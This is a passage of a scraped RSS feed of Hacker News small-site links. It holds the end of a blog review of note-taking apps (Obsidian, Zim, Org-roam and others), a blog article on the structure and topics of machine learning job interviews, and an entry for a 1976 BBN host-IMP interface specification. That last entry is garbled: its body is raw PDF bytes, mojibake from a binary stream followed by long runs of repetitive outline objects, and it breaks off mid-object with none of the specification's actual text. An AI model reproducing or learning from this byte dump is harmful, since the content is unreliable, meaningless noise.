guy, I like my keyboard.</p><h2>Obsidian</h2><p><a href="https://obsidian.md/">Obsidian</a> is a recent and gorgeous option for note-taking. It was actually my first introduction to backlinking and this whole area of decentralized notes. It's a commercial-style app (more on that below), but also works off of just a directory of markdown files. So you get to keep your content regardless. It feels great to use, I like its editor (not as well as <a href="https://typora.io/">Typora</a> or Notion though), and it's fast, responsive, and the keyboard shortcuts are great. It even has a basic Vim mode.</p><p>My only hangups are: if you use it for commercial purposes, the license becomes a pay-as-you-go SAAS license. The free license is just for personal use. Also, it's not open source, so there's always the risk that the company could go under and disappear, or worse, that they start charging way after I'm invested in it. Sure, they're just markdown files...I could make my own note-taking app if that were the case...but I don't have that much time or interest. Also, the backlinks seem to just be at the note level, but I didn't mind that as much in this app.</p><p>Still, if you're looking for a personal note-taking app that's easy to get into, supports backlinks, has the graph, uses markdown, is modern-looking, and is nice to use, totally give Obsidian a try.</p><h2>Joplin</h2><p><a href="https://joplinapp.org/">Joplin</a> is one that I've just tried a little bit. It looks fine as far as an editor, has nice backlinking, etc. The one hangup that made me put it down quickly is that links are always based on note ID, so you have to find a note to get its ID and insert it. It didn't seem nearly as fast or practical as I wanted. It is open source though, and worth a look.</p><h2>Trilium</h2><p><a href="https://github.com/zadam/trilium">Trilium</a> is an app I see recommended often. It's also free and open source. It claims to have automatic markdown conversion, but I couldn't get it to work. I gave up pretty soon after that.</p><h2>Zim</h2><p><a href="https://zim-wiki.org/">Zim</a> is a desktop wiki that I've used quite a lot in the past. It also has a backlinks plugin. It works great, is open source as well, and is very quick for taking notes. The negatives for this one are that it looks old and that it uses a custom wiki syntax that I don't like as well as markdown or Org.</p><h2>MindForger</h2><p><a href="https://www.mindforger.com/">MindForger</a> kind of does its own thing. It's difficult to explain, but worth checking out. It kind of has backlinks in that it has notes that are related to each other, but in more of an AI/intuitive way than in a manual way. It takes the headlines of Markdown files and makes them notes, but for each note lets you embed other top headlines/etc. It's weird but worth checking out. For a great intro, watch the video at <a href="https://www.youtube.com/watch?v=PlW2e1X3O-I">https://www.youtube.com/watch?v=PlW2e1X3O-I</a>.</p><p>MindForger is open source and seems really powerful. I'm going to keep playing with it. The only negative is that it's got the whole split-screen preview/markdown editor like many of the others on this list, but there's no graphical component to the editor at all. The keyboard shortcuts are multi-key and not configurable as well, but they're intuitive.</p><h2>Foam</h2><p><a href="https://foambubble.github.io/foam/">Foam</a> is a plugin to Visual Studio code that emulates many features from Roam/Obsidian. It has backlinks, a graph, and looks decent.</p><p>Honestly, though, I don't like Visual Studio code, it's not the greatest editing experience, and the backlinks seem majorly delayed from saving. But maybe that was just my experience. This is one that has a lot of promise and I would keep my eye on in the future, but seems it has a little ways to go.</p><p>I'll give an honorable mention to <a href="https://github.com/dendronhq/dendron">Dendron</a>, which seems to be at least on par with Foam. It also has a hierarchical system but seems to keep all of the files in the same directory using a dot-separated notation. Also worth checking out and watching, but also had delayed backlink processing and note a great markdown editing experience.</p><h2>Org-roam</h2><p><a href="https://www.orgroam.com/">Org-roam</a> is where I landed for now. Org-roam is an extension of the famous <a href="https://orgmode.org/">Org Mode</a> for Emacs. I used Org Mode a LOT when I was new to Emacs. It's really crazy how deep the rabbit hole goes for Org Mode. Org Mode is best described as an outliner, journal, day planner, calendar, TODO list, kanban board, interactive coding tool, TODO capture tool (including linking to source code lines, a browser, or even against a pdf as you're reading it), and presentation software. I'm sure there are a dozen or two things I'm missing too.</p><p>I'll caveat this though...you have to be a little crazy to use org-mode. Configuring it alone can be a trial in insanity, but once you master …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://jself.net/posts/note-taking/">https://jself.net/posts/note-taking/</a></em></p>]]>
            </description>
            <link>https://jself.net/posts/note-taking/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24949421</guid>
            <pubDate>Sat, 31 Oct 2020 05:52:53 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[What You Can Expect in Machine Learning Interviews]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24949145">thread link</a>) | @nutellalover
<br/>
October 30, 2020 | https://www.blog.confetti.ai/post/what-you-can-expect-in-machine-learning-interviews | <a href="https://web.archive.org/web/*/https://www.blog.confetti.ai/post/what-you-can-expect-in-machine-learning-interviews">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-hook="post-description"><article><div><div data-rce-version="7.19.2"><div dir="ltr"><div><div id="viewer-3rikt"><div><div data-hook="imageViewer" role="button" tabindex="0"><div role="img"><p><img data-pin-url="https://www.blog.confetti.ai/post/what-you-can-expect-in-machine-learning-interviews" data-pin-media="https://static.wixstatic.com/media/4feadc_7a6668848e7246daa3e922d0aecdf505~mv2.jpg/v1/fit/w_1000%2Ch_1000%2Cal_c%2Cq_80/file.png" src="https://static.wixstatic.com/media/4feadc_7a6668848e7246daa3e922d0aecdf505~mv2.jpg/v1/fit/w_300,h_300,al_c,q_5/file.jpg"></p></div></div></div></div><p id="viewer-7qfct">It's no surprise that machine learning jobs today are among the hottest on the market. <a href="https://artificialintelligence-news.com/2019/03/15/machine-learning-jobs-high-paying-demand/" target="_blank" rel="noopener"><u>Recent studies</u></a> have shown that the position of <strong>machine learning engineer </strong>commands one of the highest base salaries among surveyed jobs and has seen a 344% increase in number of postings from 2015-2018!</p><p id="viewer-403m8">So these jobs are clearly in high demand. But what does it take to secure one of these highly sought-after positions? Like any job in technology, machine learning positions require candidates to go through a rigorous series of technical interviews. </p><p id="viewer-43gc5">What is the structure of these interviews? What topics are covered? Are these interviews similar to software engineering? (Spoiler: sorta, kinda) Who is paying for lunch? </p><p id="viewer-781mt">There are a lot of questions, but not a lot of answers out there. This is largely because the field of machine learning is still young and learning to stand on its own two feet. </p><p id="viewer-cemkd">This article is intended to be the missing guide for what to expect in a machine learning interview. The observations in this post are born out of collective experiences interviewing for machine learning engineer and scientist positions, comprising over 90 hours of interview time across 80+ interviews at big (FAANG) companies, small (just out of Y-Combinator) companies, and everything in-between.</p><p id="viewer-522i9">Let's get started.</p><h3 id="viewer-32gml"><strong>Machine learning interviews are diverse...sometimes</strong></h3><p id="viewer-ecirs">The machine learning landscape is constantly evolving. If you were entering the world of machine learning ~4 years ago, the most in-demand skill would be the ability to build and debug deep learning models. Today with the rise of tools like PyTorch and Tensorflow, a bigger issue is not so much how to build machine learning prototypes but rather how to take them all the way to a deployed system in production (also called the last-mile problem). </p><p id="viewer-63ac7">What this means is that over the course of several years of interviewing for these positions, we've learned that the nature of these assessments can be incredibly diverse. For example, the following are examples of real interview types/questions that we've had:</p><p id="viewer-ac86k">	1) Read a recent paper on unsupervised learning for noise reduction and whiteboard extensions to the techniques proposed in the paper</p><p id="viewer-aj8c3">	2) Explain the nodes in the Tensorflow computational graph for a feedforward layer of a neural network</p><p id="viewer-5lue8">	3) Give an hour-long talk about some machine learning project you have done and get grilled on its details</p><p id="viewer-4bjvl">	4)  Describe how you would implement Google's autocomplete </p><p id="viewer-2p8og">	5) Explain why L1 regularization encourages sparsity in features</p><p id="viewer-5hjhh">Sound like these questions are all over the place? Don't get overwhelmed: they are.</p><p id="viewer-53d1i">Does that mean you will have to know how to do all of the above for your interview? No, definitely not. This variety is only meant to illustrate that many things are fair game depending on the company you are applying to and what they expect your responsibilities will be. </p><p id="viewer-3hihv">For example, if you are applying to a more research-intensive machine learning position, you may be asked to explain research-caliber work (either yours or that of others). Or if you are going to be a machine learning engineer at a young company, you may have to be more familiar with the internals of a framework or technology stack that is in high-demand. It really depends.</p><p id="viewer-7annu">That being said, as the field has matured, we've seen that the responsibilities of these positions are getting more well-defined leading to more standardized assessment structures.</p><p id="viewer-ciu37">Nowadays for most machine learning engineer positions, you can expect your interview journey to look something like the following:</p><ul><li id="viewer-6irq6"><p>First screening call with a recruiter</p></li><li id="viewer-edt1j"><p>Technical phone interview covering some software engineering and machine learning theory</p></li><li id="viewer-e1103"><p>Onsite (~4-5 interviews)</p></li></ul><p id="viewer-esrfv">                - Software engineering principles (~2 interviews)</p><p id="viewer-62fec">                - Machine learning theory (~1 interviews)</p><p id="viewer-2ugbd">                - Machine learning system design (~1-2 interviews)</p><p id="viewer-es0je">                - Interview with management (cultural fit check, typical in startups)</p><p id="viewer-73jhi">This can be subject to change depending on the company, but we've largely seen that common format across interviews today. Now let's discuss what to expect in terms of specific skills being evaluated.</p><h3 id="viewer-avlia"><strong>Know your machine learning theory</strong></h3><p id="viewer-dob3m">When applying for machine learning jobs you will always be asked about machine learning theory. In a sense, this a "well duh" moment but the <a href="http://www.cs.cmu.edu/~tom/mlbook.html" target="_blank" rel="noopener"><u>machine learning</u></a> <a href="https://web.stanford.edu/~hastie/ElemStatLearn/" target="_blank" rel="noopener"><u>theory</u></a> <a href="https://www.microsoft.com/en-us/research/people/cmbishop/prml-book/" target="_blank" rel="noopener"><u>literature</u></a> is vast so knowing what to focus on rather than working through multiple 1000-page textbooks is the key question.</p><p id="viewer-et0di"> Conceptual questions are asked in one of two forms: 1) in the context of some larger problem (i.e. while describing a system design, discuss model tradeoffs) or 2) in isolation (i.e. spend 30+ minutes describing how your favorite supervised learning algorithm works).</p><p id="viewer-t28k">In either case, the types of questions and concepts you'll be asked about stay pretty consistent. Our survey of past machine learning interviews has shown that you will tend to be tested on topics such as the following:</p><p id="viewer-5srhm">	1) What is the bias-variance tradeoff?</p><p id="viewer-fo0au">	2) What is overfitting/underfitting and how do you know when your model is suffering from those issues?</p><p id="viewer-bg784">	3) How do you evaluate model performance (which metrics are used and why)?</p><p id="viewer-b17gt">	4) Can you explain how some classical machine learning models work (logistic regression, k-nearest neighbors, support vector machines, decision trees, etc.)?</p><p id="viewer-2o3la">	5) What are common techniques for unsupervised learning?</p><p id="viewer-3sb7r">	6) How do you pick the best features for your model?</p><p id="viewer-b7b5m">That being said, because the collection of potential theory topics is so large, we've distilled the key concepts seen in interviews into a <a href="https://www.confetti.ai/assets/ml-primer/ml_primer.pdf" target="_blank" rel="noopener"><u>primer with practice exercises</u></a>. </p><h3 id="viewer-537k4"><strong>Software engineering is still important</strong></h3><p id="viewer-8v5gq">While the focus of machine learning jobs isn't just software engineering, you should still expect to be asked some more traditional coding and algorithms questions. These questions will be very similar, if not identical, to those you would be asked in a standard engineering interview. </p><p id="viewer-27v4b">Although this may seem unrelated to what you would think a machine learning practitioner does, when you are on the job knowing <em>how</em> to theoretically build a model is not the same as doing the actual building. This is true whether or not you are applying to be a machine learning scientist or a machine learning engineer. You need to be proficient in coding, debugging, and thinking through algorithms exercises. As an example of topics you can expect to be asked about:</p><p id="viewer-eal72">	1) Recursion and memoization (you'll basically never use recursion in the real world but 		   it's often used to evaluate your ability to think through an algorithm)</p><p id="viewer-cmind">	2) Memory and run-time complexity analysis</p><p id="viewer-d4m4q">	3) Standard data structures like trees, linked lists, hash maps, and general graphs</p><p id="viewer-9rse9">That being said, the standards for coding may not be the same in your interviews as they would be of someone applying for a pure software development position. In other words your engineering abilities might not need to be as sophisticated, especially if you are just coming out of an advanced graduate degree program in machine learning where your focus was more on pushing state-of-the-art rather than building robust training pipelines. </p><p id="viewer-dkeon">For software engineering, there are a number of popular <a href="http://www.crackingthecodinginterview.com/" target="_blank" rel="noopener"><u>books</u></a> and <a href="https://leetcode.com/" target="_blank" rel="noopener"><u>services</u></a> that can help you practice these skills.</p><h3 id="viewer-76m1h"><strong>Know how to build machine learning systems</strong></h3><p id="viewer-ba220">Knowing how to architect machine learning systems is one of the most important skills you can have going into the field of machine learning. One of the big aspects of machine learning's evolution in the past 1-2 years is that companies are going all-in on integrating data-driven solutions to extract business value across their teams. At scale this can lead to <a href="https://www.kdd.org/kdd2019/accepted-papers/view/150-successful-machine-learning-models-6-lessons-learned-at-booking.com" target="_blank" rel="noopener"><u>tremendous improvements</u></a> in the quality of a service. </p><p id="viewer-2j318">When you are being brought into a team as a machine learning expert, the expectation is that you will be able to apply machine learning skills to improve some existing manual process. Oftentimes you will be presented with very vague problem descriptions (e.g. "I want these recommendations to be better") and you will have to break down and frame the problem in a form where machine learning is applicable.</p><p id="viewer-bj4et">This is the core of designing and architecting machine learning systems. This skill is among the most crucial ones that companies look for when evaluating candidates. A system design interview will involve being presented with a case study (e.g. "we want a tool that can help us detect offensive content on our platform") and then talking through how to set up a machine learning pipeline that can address the problem. Along the way you will be assessed on your ability to:</p><p id="viewer-b3dv8">	1) Gather and validate datasets needed for your models</p><p id="viewer-3ctv5">	2) Build training infrastructure</p><p id="viewer-actbm">	3) Discuss the tradeoffs among potential modelling solutions</p><p id="viewer-7bofr">	4) Know what metrics you will track for model performance</p><p id="viewer-5tid6">	5) Interpret model predictions and do error analysis</p><p id="viewer-b2nej">	6) Architect a deployment solution (e.g. cloud-based, on-device, etc.)</p><p id="viewer-3hr9b">	7) Iterate on user feedback to improve the solution</p><p id="viewer-2fn8e">The important thing to recognize in these types of interviews is that there is never one "correct" answer. Your interviewers are more interested in knowing how you think through a problem. You will be asked to justify your decisions and also adapt them based on new situations (e.g. "now imagine we don't have enough money to gather 1 million annotated images...").</p><p id="viewer-2plnr">When preparing for these types of interviews, there's no substitute for real-world experience. Build projects so you witness firsthand what tradeoffs are necessary to consider. If that's not possible, spend a lot of time reading through company use-cases and learning how others have <a href="https://github.com/eugeneyan/applied-ml" target="_blank" rel="noopener"><u>solved similar problems</u></a>. </p><h3 id="viewer-44oq9"><strong>Technical interviews are just one signal</strong></h3><p id="viewer-dmrea">The last point worth mentioning is that while technical interviews are important signals in determining whether you get the job, they are still only one of many contributing signals. In particular, many startups also place great emphasis on your cultural fit …</p></div></div></div></div></article></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.blog.confetti.ai/post/what-you-can-expect-in-machine-learning-interviews">https://www.blog.confetti.ai/post/what-you-can-expect-in-machine-learning-interviews</a></em></p>]]>
            </description>
            <link>https://www.blog.confetti.ai/post/what-you-can-expect-in-machine-learning-interviews</link>
            <guid isPermaLink="false">hacker-news-small-sites-24949145</guid>
            <pubDate>Sat, 31 Oct 2020 04:30:16 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Specifications for the Interconnection of a Host and an IMP (1976) [pdf]]]>
            </title>
            <description>
<![CDATA[
Score 17 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24949100">thread link</a>) | @tjalfi
<br/>
October 30, 2020 | https://walden-family.com/impcode/BBN1822_Jan1976.pdf | <a href="https://web.archive.org/web/*/https://walden-family.com/impcode/BBN1822_Jan1976.pdf">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>èlè[mxEBðcƒßgÞš„{
L�Î‚ë:ø5TÜâvu~e ­Ïwwã«Sršíò;B¥×6þúSÈÝ.$¸}†¡Ë1­
›2=É¿Ö³;qK˜Ú%†`
æ`À`,¨:ŽkW‘á ˜0aÂh¢I‰†ù'Ck±101\âëàd!ÆÀÇÌÀ¬ ìàË˜Áº@¬!
™:Í˜Ãº…: ÎÃX0J‘GÅ2–°�ù¯ƒÀ¡ø20°‚b`b2ö\‘
endstream
endobj
1237 0 obj
677 
endobj
1023 0 obj
&lt;&lt; 
/Contents 1232 0 R 
/Parent 1019 0 R 
/Resources &lt;&lt; /XObject &lt;&lt; /ImA 1235 0 R &gt;&gt; /ProcSet [ /PDF /ImageB ] &gt;&gt; 
/MediaBox [ 0 0 612 792 ] 
/Type /Page 
/CropBox [ 0 0 612 792 ] 
/Rotate 0 
&gt;&gt; 
endobj
1024 0 obj
&lt;&lt; 
/Count -207 
/Last 1025 0 R 
/First 1026 0 R 
&gt;&gt; 
endobj
1025 0 obj
&lt;&lt; 
/Prev 1231 0 R 
/Parent 1024 0 R 
/Dest [ 1014 0 R /Fit ] 
/Title (H-28)
&gt;&gt; 
endobj
1026 0 obj
&lt;&lt; 
/Next 1027 0 R 
/Parent 1024 0 R 
/Dest [ 1023 0 R /Fit ] 
/Title (0001)
&gt;&gt; 
endobj
1027 0 obj
&lt;&lt; 
/Next 1028 0 R 
/Prev 1026 0 R 
/Parent 1024 0 R 
/Dest [ 1 0 R /Fit ] 
/Title (0002)
&gt;&gt; 
endobj
1028 0 obj
&lt;&lt; 
/Next 1029 0 R 
/Prev 1027 0 R 
/Parent 1024 0 R 
/Dest [ 6 0 R /Fit ] 
/Title (0003)
&gt;&gt; 
endobj
1029 0 obj
&lt;&lt; 
/Next 1030 0 R 
/Prev 1028 0 R 
/Parent 1024 0 R 
/Dest [ 11 0 R /Fit ] 
/Title (001)
&gt;&gt; 
endobj
1030 0 obj
&lt;&lt; 
/Next 1031 0 R 
/Prev 1029 0 R 
/Parent 1024 0 R 
/Dest [ 16 0 R /Fit ] 
/Title (002)
&gt;&gt; 
endobj
1031 0 obj
&lt;&lt; 
/Next 1032 0 R 
/Prev 1030 0 R 
/Parent 1024 0 R 
/Dest [ 21 0 R /Fit ] 
/Title (003)
&gt;&gt; 
endobj
1032 0 obj
&lt;&lt; 
/Next 1033 0 R 
/Prev 1031 0 R 
/Parent 1024 0 R 
/Dest [ 26 0 R /Fit ] 
/Title (004)
&gt;&gt; 
endobj
1033 0 obj
&lt;&lt; 
/Next 1034 0 R 
/Prev 1032 0 R 
/Parent 1024 0 R 
/Dest [ 31 0 R /Fit ] 
/Title (005)
&gt;&gt; 
endobj
1034 0 obj
&lt;&lt; 
/Next 1035 0 R 
/Prev 1033 0 R 
/Parent 1024 0 R 
/Dest [ 36 0 R /Fit ] 
/Title (006)
&gt;&gt; 
endobj
1035 0 obj
&lt;&lt; 
/Next 1036 0 R 
/Prev 1034 0 R 
/Parent 1024 0 R 
/Dest [ 41 0 R /Fit ] 
/Title (007)
&gt;&gt; 
endobj
1036 0 obj
&lt;&lt; 
/Next 1037 0 R 
/Prev 1035 0 R 
/Parent 1024 0 R 
/Dest [ 46 0 R /Fit ] 
/Title (008)
&gt;&gt; 
endobj
1037 0 obj
&lt;&lt; 
/Next 1038 0 R 
/Prev 1036 0 R 
/Parent 1024 0 R 
/Dest [ 49 0 R /Fit ] 
/Title (1-01)
&gt;&gt; 
endobj
1038 0 obj
&lt;&lt; 
/Next 1039 0 R 
/Prev 1037 0 R 
/Parent 1024 0 R 
/Dest [ 54 0 R /Fit ] 
/Title (1-02)
&gt;&gt; 
endobj
1039 0 obj
&lt;&lt; 
/Next 1040 0 R 
/Prev 1038 0 R 
/Parent 1024 0 R 
/Dest [ 59 0 R /Fit ] 
/Title (1-03)
&gt;&gt; 
endobj
1040 0 obj
&lt;&lt; 
/Next 1041 0 R 
/Prev 1039 0 R 
/Parent 1024 0 R 
/Dest [ 64 0 R /Fit ] 
/Title (1-04)
&gt;&gt; 
endobj
1041 0 obj
&lt;&lt; 
/Next 1042 0 R 
/Prev 1040 0 R 
/Parent 1024 0 R 
/Dest [ 69 0 R /Fit ] 
/Title (1-05)
&gt;&gt; 
endobj
1042 0 obj
&lt;&lt; 
/Next 1043 0 R 
/Prev 1041 0 R 
/Parent 1024 0 R 
/Dest [ 74 0 R /Fit ] 
/Title (1-06)
&gt;&gt; 
endobj
1043 0 obj
&lt;&lt; 
/Next 1044 0 R 
/Prev 1042 0 R 
/Parent 1024 0 R 
/Dest [ 79 0 R /Fit ] 
/Title (1-07)
&gt;&gt; 
endobj
1044 0 obj
&lt;&lt; 
/Next 1045 0 R 
/Prev 1043 0 R 
/Parent 1024 0 R 
/Dest [ 84 0 R /Fit ] 
/Title (1-08)
&gt;&gt; 
endobj
1045 0 obj
&lt;&lt; 
/Next 1046 0 R 
/Prev 1044 0 R 
/Parent 1024 0 R 
/Dest [ 87 0 R /Fit ] 
/Title (2-01)
&gt;&gt; 
endobj
1046 0 obj
&lt;&lt; 
/Next 1047 0 R 
/Prev 1045 0 R 
/Parent 1024 0 R 
/Dest [ 92 0 R /Fit ] 
/Title (2-02)
&gt;&gt; 
endobj
1047 0 obj
&lt;&lt; 
/Next 1048 0 R 
/Prev 1046 0 R 
/Parent 1024 0 R 
/Dest [ 97 0 R /Fit ] 
/Title (2-03)
&gt;&gt; 
endobj
1048 0 obj
&lt;&lt; 
/Next 1049 0 R 
/Prev 1047 0 R 
/Parent 1024 0 R 
/Dest [ 102 0 R /Fit ] 
/Title (2-04)
&gt;&gt; 
endobj
1049 0 obj
&lt;&lt; 
/Next 1050 0 R 
/Prev 1048 0 R 
/Parent 1024 0 R 
/Dest [ 107 0 R /Fit ] 
/Title (2-05)
&gt;&gt; 
endobj
1050 0 obj
&lt;&lt; 
/Next 1051 0 R 
/Prev 1049 0 R 
/Parent 1024 0 R 
/Dest [ 112 0 R /Fit ] 
/Title (2-06)
&gt;&gt; 
endobj
1051 0 obj
&lt;&lt; 
/Next 1052 0 R 
/Prev 1050 0 R 
/Parent 1024 0 R 
/Dest [ 117 0 R /Fit ] 
/Title (2-07)
&gt;&gt; 
endobj
1052 0 obj
&lt;&lt; 
/Next 1053 0 R 
/Prev 1051 0 R 
/Parent 1024 0 R 
/Dest [ 122 0 R /Fit ] 
/Title (2-08)
&gt;&gt; 
endobj
1053 0 obj
&lt;&lt; 
/Next 1054 0 R 
/Prev 1052 0 R 
/Parent 1024 0 R 
/Dest [ 127 0 R /Fit ] 
/Title (2-09)
&gt;&gt; 
endobj
1054 0 obj
&lt;&lt; 
/Next 1055 0 R 
/Prev 1053 0 R 
/Parent 1024 0 R 
/Dest [ 132 0 R /Fit ] 
/Title (2-10)
&gt;&gt; 
endobj
1055 0 obj
&lt;&lt; 
/Next 1056 0 R 
/Prev 1054 0 R 
/Parent 1024 0 R 
/Dest [ 137 0 R /Fit ] 
/Title (2-11)
&gt;&gt; 
endobj
1056 0 obj
&lt;&lt; 
/Next 1057 0 R 
/Prev 1055 0 R 
/Parent 1024 0 R 
/Dest [ 142 0 R /Fit ] 
/Title (2-12)
&gt;&gt; 
endobj
1057 0 obj
&lt;&lt; 
/Next 1058 0 R 
/Prev 1056 0 R 
/Parent 1024 0 R 
/Dest [ 147 0 R /Fit ] 
/Title (2-13)
&gt;&gt; 
endobj
1058 0 obj
&lt;&lt; 
/Next 1059 0 R 
/Prev 1057 0 R 
/Parent 1024 0 R 
/Dest [ 152 0 R /Fit ] 
/Title (2-14)
&gt;&gt; 
endobj
1059 0 obj
&lt;&lt; 
/Next 1060 0 R 
/Prev 1058 0 R 
/Parent 1024 0 R 
/Dest [ 157 0 R /Fit ] 
/Title (3-01)
&gt;&gt; 
endobj
1060 0 obj
&lt;&lt; 
/Next 1061 0 R 
/Prev 1059 0 R 
/Parent 1024 0 R 
/Dest [ 162 0 R /Fit ] 
/Title (3-02)
&gt;&gt; 
endobj
1061 0 obj
&lt;&lt; 
/Next 1062 0 R 
/Prev 1060 0 R 
/Parent 1024 0 R 
/Dest [ 167 0 R /Fit ] 
/Title (3-03)
&gt;&gt; 
endobj
1062 0 obj
&lt;&lt; 
/Next 1063 0 R 
/Prev 1061 0 R 
/Parent 1024 0 R 
/Dest [ 172 0 R /Fit ] 
/Title (3-04)
&gt;&gt; 
endobj
1063 0 obj
&lt;&lt; 
/Next 1064 0 R 
/Prev 1062 0 R 
/Parent 1024 0 R 
/Dest [ 177 0 R /Fit ] 
/Title (3-05)
&gt;&gt; 
endobj
1064 0 obj
&lt;&lt; 
/Next 1065 0 R 
/Prev 1063 0 R 
/Parent 1024 0 R 
/Dest [ 182 0 R /Fit ] 
/Title (3-06)
&gt;&gt; 
endobj
1065 0 obj
&lt;&lt; 
/Next 1066 0 R 
/Prev 1064 0 R 
/Parent 1024 0 R 
/Dest [ 187 0 R /Fit ] 
/Title (3-07)
&gt;&gt; 
endobj
1066 0 obj
&lt;&lt; 
/Next 1067 0 R 
/Prev 1065 0 R 
/Parent 1024 0 R 
/Dest [ 192 0 R /Fit ] 
/Title (3-08)
&gt;&gt; 
endobj
1067 0 obj
&lt;&lt; 
/Next 1068 0 R 
/Prev 1066 0 R 
/Parent 1024 0 R 
/Dest [ 197 0 R /Fit ] 
/Title (3-09)
&gt;&gt; 
endobj
1068 0 obj
&lt;&lt; 
/Next 1069 0 R 
/Prev 1067 0 R 
/Parent 1024 0 R 
/Dest [ 202 0 R /Fit ] 
/Title (3-10)
&gt;&gt; 
endobj
1069 0 obj
&lt;&lt; 
/Next 1070 0 R 
/Prev 1068 0 R 
/Parent 1024 0 R 
/Dest [ 207 0 R /Fit ] 
/Title (3-11)
&gt;&gt; 
endobj
1070 0 obj
&lt;&lt; 
/Next 1071 0 R 
/Prev 1069 0 R 
/Parent 1024 0 R 
/Dest [ 212 0 R /Fit ] 
/Title (3-12)
&gt;&gt; 
endobj
1071 0 obj
&lt;&lt; 
/Next 1072 0 R 
/Prev 1070 0 R 
/Parent 1024 0 R 
/Dest [ 217 0 R /Fit ] 
/Title (3-13)
&gt;&gt; 
endobj
1072 0 obj
&lt;&lt; 
/Next 1073 0 R 
/Prev 1071 0 R 
/Parent 1024 0 R 
/Dest [ 222 0 R /Fit ] 
/Title (3-14)
&gt;&gt; 
endobj
1073 0 obj
&lt;&lt; 
/Next 1074 0 R 
/Prev 1072 0 R 
/Parent 1024 0 R 
/Dest [ 227 0 R /Fit ] 
/Title (3-15)
&gt;&gt; 
endobj
1074 0 obj
&lt;&lt; 
/Next 1075 0 R 
/Prev 1073 0 R 
/Parent 1024 0 R 
/Dest [ 232 0 R /Fit ] 
/Title (3-16)
&gt;&gt; 
endobj
1075 0 obj
&lt;&lt; 
/Next 1076 0 R 
/Prev 1074 0 R 
/Parent 1024 0 R 
/Dest [ 237 0 R /Fit ] 
/Title (3-17)
&gt;&gt; 
endobj
1076 0 obj
&lt;&lt; 
/Next 1077 0 R 
/Prev 1075 0 R 
/Parent 1024 0 R 
/Dest [ 242 0 R /Fit ] 
/Title (3-18)
&gt;&gt; 
endobj
1077 0 obj
&lt;&lt; 
/Next 1078 0 R 
/Prev 1076 0 R 
/Parent 1024 0 R 
/Dest [ 247 0 R /Fit ] 
/Title (3-19)
&gt;&gt; 
endobj
1078 0 obj
&lt;&lt; 
/Next 1079 0 R 
/Prev 1077 0 R 
/Parent 1024 0 R 
/Dest [ 252 0 R /Fit ] 
/Title (3-20)
&gt;&gt; 
endobj
1079 0 obj
&lt;&lt; 
/Next 1080 0 R 
/Prev 1078 0 R 
/Parent 1024 0 R 
/Dest [ 257 0 R /Fit ] 
/Title (3-21)
&gt;&gt; 
endobj
1080 0 obj
&lt;&lt; 
/Next 1081 0 R 
/Prev 1079 0 R 
/Parent 1024 0 R 
/Dest [ 262 0 R /Fit ] 
/Title (3-22)
&gt;&gt; 
endobj
1081 0 obj
&lt;&lt; 
/Next 1082 0 R 
/Prev 1080 0 R 
/Parent 1024 0 R 
/Dest [ 267 0 R /Fit ] 
/Title (3-23)
&gt;&gt; 
endobj
1082 0 obj
&lt;&lt; 
/Next 1083 0 R 
/Prev 1081 0 R 
/Parent 1024 0 R 
/Dest [ 272 0 R /Fit ] 
/Title (3-24)
&gt;&gt; 
endobj
1083 0 obj
&lt;&lt; 
/Next 1084 0 R 
/Prev 1082 0 R 
/Parent 1024 0 R 
/Dest [ 277 0 R /Fit ] 
/Title (3-25)
&gt;&gt; 
endobj
1084 0 obj
&lt;&lt; 
/Next 1085 0 R 
/Prev 1083 0 R 
/Parent 1024 0 R 
/Dest [ 282 0 R /Fit ] 
/Title (3-26)
&gt;&gt; 
endobj
1085 0 obj
&lt;&lt; 
/Next 1086 0 R 
/Prev 1084 0 R 
/Parent 1024 0 R 
/Dest [ 287 0 R /Fit ] 
/Title (3-27)
&gt;&gt; 
endobj
1086 0 obj
&lt;&lt; 
/Next 1087 0 R 
/Prev 1085 0 R 
/Parent 1024 0 R 
/Dest [ 292 0 R /Fit ] 
/Title (3-28)
&gt;&gt; 
endobj
1087 0 obj
&lt;&lt; 
/Next 1088 0 R 
/Prev 1086 0 R 
/Parent 1024 0 R 
/Dest [ 297 0 R /Fit ] 
/Title (3-29)
&gt;&gt; 
endobj
1088 0 obj
&lt;&lt; 
/Next 1089 0 R 
/Prev 1087 0 R 
/Parent 1024 0 R 
/Dest [ 302 0 R /Fit ] 
/Title (3-30)
&gt;&gt; 
endobj
1089 0 obj
&lt;&lt; 
/Next 1090 0 R 
/Prev 1088 0 R 
/Parent 1024 0 R 
/Dest [ 307 0 R /Fit ] 
/Title (3-31)
&gt;&gt; 
endobj
1090 0 obj
&lt;&lt; 
/Next 1091 0 R 
/Prev 1089 0 R 
/Parent 1024 0 R 
/Dest [ 312 0 R /Fit ] 
/Title (3-32)
&gt;&gt; 
endobj
1091 0 obj
&lt;&lt; 
/Next 1092 0 R 
/Prev 1090 0 R 
/Parent 1024 0 R 
/Dest [ 317 0 R /Fit ] 
/Title (3-33)
&gt;&gt; 
endobj
1092 0 obj
&lt;&lt; 
/Next 1093 0 R 
/Prev 1091 0 R 
/Parent 1024 0 R 
/Dest [ 322 0 R /Fit ] 
/Title (3-34)
&gt;&gt; 
endobj
1093 0 obj
&lt;&lt; 
/Next 1094 0 R 
/Prev 1092 0 R 
/Parent 1024 0 R 
/Dest [ 327 0 R /Fit ] 
/Title (3-35)
&gt;&gt; 
endobj
1094 0 obj
&lt;&lt; 
/Next 1095 0 R 
/Prev 1093 0 R 
/Parent 1024 0 R 
/Dest [ 332 0 R /Fit ] 
/Title (3-36)
&gt;&gt; 
endobj
1095 0 obj
&lt;&lt; 
/Next 1096 0 R 
/Prev 1094 0 R 
/Parent 1024 0 R 
/Dest [ 337 0 R /Fit ] 
/Title (3-37)
&gt;&gt; 
endobj
1096 0 obj
&lt;&lt; 
/Next 1097 0 R 
/Prev 1095 0 R 
/Parent 1024 0 R 
/Dest [ 342 0 R /Fit ] 
/Title (3-38)
&gt;&gt; 
endobj
1097 0 obj
&lt;&lt; 
/Next 1098 0 R 
